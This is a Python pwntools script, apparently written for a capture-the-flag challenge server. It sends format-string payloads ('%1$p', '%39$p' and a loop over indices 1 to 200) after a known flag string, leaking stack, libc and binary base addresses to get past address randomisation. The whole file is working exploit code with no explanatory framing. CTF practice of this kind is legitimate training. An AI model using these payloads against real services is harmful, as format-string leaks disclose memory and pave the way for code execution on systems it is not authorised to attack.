from pwn import *

# Set context
context.arch = 'amd64'

def get_leaks():
    r = remote('chals.cyberjousting.com', 1367)
    # Leak stack (1), libc (2), binary base (39)
    # We use | as separator
    payload = b'byuctf{welcome_to_rev_fellas}' + b'|%1$p|%2$p|%39$p|%18$p|%19$p|%20$p'
    r.sendlineafter(b'?', payload)
    r.recvuntil(b'Correct! The flag is ')
    data = r.recvline().decode().strip()
    leaks = data.split('|')[1:]
    r.close()
    return leaks

def leak_more():
    for start in range(1, 201, 10):
        r = remote('chals.cyberjousting.com', 1367)
        payload = b'byuctf{welcome_to_rev_fellas}'
        for i in range(start, start + 10):
            payload += f"|%{i}$p".encode()
        r.sendlineafter(b'?', payload)
        try:
            r.recvuntil(b'Correct! The flag is ')
            print(f"Indices {start}-{start+9}: {r.recvline()}")
        except:
            print(f"Indices {start}-{start+9}: CRASH")
        r.close()

leak_more()
